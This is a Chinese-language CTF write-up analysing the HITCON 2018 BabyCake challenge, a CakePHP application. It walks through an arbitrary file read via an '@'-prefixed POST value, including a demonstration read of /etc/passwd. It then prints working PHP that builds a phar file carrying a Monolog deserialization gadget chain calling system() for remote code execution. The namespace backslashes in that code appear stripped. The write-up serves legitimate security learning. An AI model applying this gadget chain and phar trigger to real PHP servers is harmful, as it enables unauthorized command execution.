# Hitcon2018 BabyCake题目分析

阅读量 **284047**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-10-22 15:37:39

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/dm/1024_657_/t0199068ccd4981eefe.jpg)

> orange大佬出的题目，质量很高，能学到不少东西，这里简单分析复现一下。

## 初见题目

刚开始拿到题目源码，发现使用的是cakephp框架，逻辑代码并不是很多，大体的逻辑是实现了一个http访问器，这里很多参赛者很容易想到ssrf攻击去，但是很快出题者就给出了提示。

![](https://p4.ssl.qhimg.com/t01ecb28f98258f52d3.png)

就说明这个题目与ssrf攻击无关，然后通过简单的观察，发现了出题人在使用composer安装php组件的过程中，使用了一个低版本的存在反序列化rce的组件：

![](https://p1.ssl.qhimg.com/t010ba112b191844ca0.png)

这是一个很明显的提示点，那么这个题目很有可能就是利用反序列化执行命令来解的，在writeup中也证实了我们的猜想。

## 题目逻辑代码分析

题目的逻辑集中在 src/Controller/PageController.php 中，下面分析一下几个具体的实现：

###  1\. 缓存机制实现

![](https://p2.ssl.qhimg.com/t0167bbe9016fd2995e.png)

代码实现了一个简单的缓存逻辑，关注点有两个，第一个是缓存的路径，简单追踪一下代码，可以看到缓存逻辑：

![](https://p5.ssl.qhimg.com/t0188ae08a493e9007e.png)

所以缓存路径是可以得到的 /var/www/html/tmp/CLIENTIP/md5(url)/
，第二个就是缓存的文件名，文件分为两个，一个是body.cache ,另一个是 headers.cache.

###  2\. 序列化与反序列化

可以看到在缓存机制中，有关headers.cache是采用了序列化的机制，会把请求得到的返回头序列化以后，存储到文件中去，然后在读取缓存的过程中反序列化执行，这里是一个很明显的利用点，估计很多攻击者都会去底层代码中寻找有关这个地方反序列化的利用技巧，我在刚开始的时候也是被困在这里了，直到看到writeup，才恍然大悟，这是一个陷阱。最后的利用思路反而在没有序列化操作的body.cache，不得不说orange大佬出题果然厉害，那我们就来看一下，具体是怎么一步一步实现的反序列化。

## 任意文件读取漏洞的发现

首先跟踪了一遍有关get请求处理文件头的操作，发现得到的请求头，会被当做一个数组被反序列化，这里我们无论怎么修改，都还是一个array，一个unserialize是不会反序列化两层的，所以headers.cache这条利用思路是不可控的，所以我们继续跟进一下有关post的具体处理流程：

![](https://p2.ssl.qhimg.com/t01de94b9a383e0c0e7.png)

首先跟进httpclient：

![](https://p2.ssl.qhimg.com/t01f829d222a305c4ed.png)

然后跟进Client类：

![](https://p3.ssl.qhimg.com/t010d2882de4f6d5246.png)

然后跟进到_doRequest函数：

![](https://p0.ssl.qhimg.com/t01d4cff8e1b848d167.png)

然后继续跟进_createRequest：

![](https://p1.ssl.qhimg.com/t0144edd12ef16ffb4d.png)

还是没有发现具体的实现，于是继续跟进Request类：

![](https://p0.ssl.qhimg.com/t0192968ee52a3acd5c.png)

在Request类中，发现了构建请求body的函数，然后跟进到具体FormData类的addMany函数中：

![](https://p0.ssl.qhimg.com/t011b8ee2bcafa924e9.png)

然后就追踪到了一个关键的代码点：

![](https://p3.ssl.qhimg.com/t01dc52e4ba90e37f67.png)

这里判断了一下传入的 $value 是否是以 @ 开头的，如果是，则进入 addFile 函数中：

![](https://p1.ssl.qhimg.com/t01e4194fbcf4f952bb.png)

这个函数中，我们发现如果传入的 $value
不是一个资源，那就会去掉最开头的一个@符号，然后采用file_get_contents读取这个路径。这里很容易联想到最近ctf出题中很火的phar://
反序列化漏洞，和这个题目也是刚好吻合，所以基本上思路是对的。

那我们首先来尝试一下，读一下 /etc/passwd 文件，我们只要构造一个post请求，然后将传入的data数组的某个键的值改成 @/etc/passwd
就可以读取文件，本地搭建了一个环境进行测试：

![](https://p0.ssl.qhimg.com/t0175ea40bc5258c3cf.png)

在8888 端口我们收到了请求：

![](https://p5.ssl.qhimg.com/t0160a54e64f95f85dc.png)

既然我们实现了任意文件读取，那我们就要构思如何进行反序列化rce了。

## 构造反序列化执行命令

通过整理思路，我们构建了一个利用payload：

![](https://p5.ssl.qhimg.com/t019034c288b2a4ec69.png)

下面我们来本地测试一下：

首先我们可以在phpggc项目中，找到该版本Monolog
反序列化漏洞的有关[代码](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/gadgets.php)。

生成phar文件的代码,放到项目中执行即可：

    
    
    <?php
    
    namespace MonologHandler
    {
        class SyslogUdpHandler
        {
            protected $socket;
            function __construct($x)
            {
                $this->socket = $x;
            }
        }
        class BufferHandler
        {
            protected $handler;
            protected $bufferSize = -1;
            protected $buffer;
            # ($record['level'] < $this->level) == false
            protected $level = null;
            protected $initialized = true;
            # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
            protected $bufferLimit = -1;
            protected $processors;
            function __construct($methods, $command)
            {
                $this->processors = $methods;
                $this->buffer = [$command];
                $this->handler = clone $this;
            }
        }
    }
    
    namespace{
        $cmd = "ls -alt";
    
        $obj = new MonologHandlerSyslogUdpHandler(
            new MonologHandlerBufferHandler(
                ['current', 'system'],
                [$cmd, 'level' => null]
            )
        );
    
        $phar = new Phar('exploit.phar');
        $phar->startBuffering();
        $phar->addFromString('test', 'test');
        $phar->setStub('<?php __HALT_COMPILER(); ? >');
        $phar->setMetadata($obj);
        $phar->stopBuffering();
    
    }
    

###  1\. 缓存phar文件到body.cache

![](https://p5.ssl.qhimg.com/t01144d3a8add838b17.png)

并且计算出缓存文件所在的路径：

/var/www/html/tmp/cache/mycache/153.36.215.119/1e8685bf0442fcf3bd25e23908aeb314

###  2\. 通过post请求 @ 符号触发file_get_contents 查看payload

![](https://p2.ssl.qhimg.com/t01e00eea38851c5cb2.png)

![](https://p5.ssl.qhimg.com/t01d3f9df3daac5b074.png)

###  3\. phar:// 协议触发反序列化，执行命令

![](https://p3.ssl.qhimg.com/t0173a822926c33362a.png)

###  4\. 获取flag

能够执行命令，获取flag就轻而易举了，本地只是测试，随手写了一个flag, 只需要修改生成phar代码中的 $cmd 即可：

  
到此整个流程分析完毕。

## 后记

不得不说，orange大佬出的题目设计很巧妙，需要比较强的代码追踪能力和足够的经验，感谢大佬出题，学到了很多。

## 参考链接以及题目源码：

<https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake>

<https://github.com/ambionics/phpggc>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **执念于心** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/162431](/post/id/162431)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [代码审计](/tag/代码审计)
  * [Hitcon2018](/tag/Hitcon2018)

 **+1** __14赞

 __收藏

![](https://thirdqq.qlogo.cn/qqapp/101430193/08F7BF551F3C69F63C5F5D0FD891D13E/40)
执念于心

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

